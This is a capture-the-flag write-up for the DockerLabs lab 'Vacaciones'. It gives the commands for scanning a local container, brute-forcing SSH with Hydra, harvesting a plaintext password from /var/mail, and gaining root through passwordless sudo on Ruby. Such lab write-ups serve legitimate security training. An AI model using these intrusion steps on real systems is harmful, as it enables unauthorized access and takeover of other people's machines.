# Vacaciones — Write-up

**Platform:** DockerLabs  
**Difficulty:** Very Easy  
**Category:** Linux, SSH, Brute Force, Privilege Escalation  
**Date:** 2026-05-09  
**Author:** Lab: Romabri, WriteUp: GrooveRoot

---

## Index

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Exploitation](#exploitation)
4. [Post-Exploitation / Privilege Escalation](#post-exploitation--privilege-escalation)
5. [Lessons Learned](#lessons-learned)

---

## Reconnaissance

**Target IP:** `172.17.0.2`

### Nmap

```bash
sudo nmap -sS -sV -sC -T4 -oA vacaciones 172.17.0.2
```

![Nmap results](assets/2.png)

**Open ports:**

|Port|Service|Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 7.6p1 Ubuntu|
|80/tcp|HTTP|Apache httpd 2.4.29|

> Two attack surfaces: a web server and SSH. I start with the web before launching anything blindly.

---

## Enumeration

### Web — curl the server

```bash
curl http://172.17.0.2
```

![curl response](assets/1.png)

The server returns a 404, but the source code contains an HTML comment:

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
<!-- From: Juan To: Camilo, I left you an email, it's important... -->
```

> Two usernames identified: `juan` and `camilo`. The comment tells us juan is writing to camilo, so camilo is the recipient — likely the one with the weak SSH credential.

---

## Exploitation

### SSH Brute Force — Hydra

With both usernames identified, I run Hydra against both in parallel from two terminals:

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -F
hydra -l juan   -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -F
```

> Camilo falls quickly. Password: `password1`.

### Initial Access — SSH as camilo

```bash
ssh camilo@172.17.0.2
```

Check sudo privileges:

```bash
sudo -l
# Nothing useful for camilo
```

---

## Post-Exploitation / Privilege Escalation

### Enumeration — internal mail

The HTML comment mentioned an email. I look in `/var/mail`:

```bash
cat /var/mail/camilo/correo.txt
```

![Mail contents](assets/3.png)

Juan left his password for camilo in plaintext: `2k84dicb`

### Pivoting to juan

```bash
su juan
# password: 2k84dicb
```

### sudo -l as juan

```bash
sudo -l
```

![sudo -l juan](assets/4.png)

Juan can run `/usr/bin/ruby` as root with no password required.

### Escalation to root — Ruby GTFOBins

```bash
sudo ruby -e 'exec "/bin/bash"'
whoami
# root
```

![Root](assets/5.png)

---

## Lessons Learned

- **Initial mistake:** I ran Hydra against `juan` first because he was the sender. The comment said "From Juan To Camilo" — the brute-force target was camilo, not juan. Read carefully before launching tools.
- **Wordlist:** Started with SecList 10k and it worked, but rockyou is more reliable for CTFs since it covers typical passwords that short lists miss.
- **New concept:** Pivoting between users on the same machine by hunting for credentials in system files (`/var/mail`).
- **GTFOBins:** Ruby with sudo → `exec "/bin/bash"`. Any interpreter with passwordless sudo is game over.
- **Rabbit hole:** The `known_hosts` SSH warning looked like a problem but was just the IP `172.17.0.2` being reused from a previous machine. Fix: `ssh-keygen -f ~/.ssh/known_hosts -R 172.17.0.2`.

---

_Write-up by [GrooveRoot](https://github.com/GrooveRoot)_
